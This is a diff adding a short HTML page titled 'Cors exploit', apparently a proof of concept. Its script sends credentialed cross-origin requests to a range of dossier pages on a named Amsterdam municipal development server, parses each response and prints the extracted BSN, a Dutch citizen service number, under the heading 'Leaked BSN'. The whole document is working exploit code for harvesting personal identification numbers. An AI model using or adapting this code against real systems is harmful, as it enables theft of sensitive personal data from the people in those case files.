@@ -1,0 +1,29 @@
+<script>
+function GetBSN(body){
+let dp = new DOMParser();
+let response = body;
+let Document = dp.parseFromString(response, "text/html");
+try{
+let bsn = Document.getElementsByClassName("dl__horizontal")[0].children[9].textContent;
+document.body.insertAdjacentHTML("beforeend", bsn + "<br>")
+}
+catch{return;}
+}
+function GetBody(url){
+let x = new XMLHttpRequest();
+x.open("GET",url,true);
+x.withCredentials = true;
+x.send();
+x.onload = function(){
+GetBSN(this.responseText)
+};
+}
+for(var i = 880; i < 900; i++){
+let url = `https://dev-fixxx8.amsterdam.nl/app/dossier/detail/${i}/voorlegger#_`;
+GetBody(url);
+}
+</script>
+<body>
+<h1>Cors exploit</h1>
+Leaked BSN:<br><br>
+</body>
